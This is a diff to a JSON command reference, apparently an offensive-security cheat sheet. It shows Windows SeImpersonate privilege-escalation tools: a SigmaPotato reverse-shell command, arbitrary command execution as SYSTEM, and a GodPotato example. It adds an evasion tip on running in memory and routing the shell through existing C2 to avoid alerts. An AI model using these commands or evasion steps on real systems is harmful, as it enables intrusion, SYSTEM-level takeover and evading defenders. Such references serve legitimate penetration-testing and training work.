@@ -72,12 +72,12 @@
     {
       "command": ".\\SigmaPotato.exe --revshell <lhost> <lport>",
       "caption": "SigmaPotato: modern SeImpersonate exploit, works on Server 2019/2022 and Win10/11",
-      "label": ".\\SigmaPotato.exe"
+      "label": "SigmaPotato - reverse shell"
     },
     {
       "command": ".\\SigmaPotato.exe \"<command>\"",
       "caption": "SigmaPotato: run arbitrary command as SYSTEM",
-      "label": ".\\SigmaPotato.exe"
+      "label": "SigmaPotato - run a command"
     },
     {
       "command": ".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
@@ -99,6 +99,7 @@
       "HTB M26",
       "MITRE T1134.001",
       "MITRE T1068"
-    ]
+    ],
+    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
   }
 }
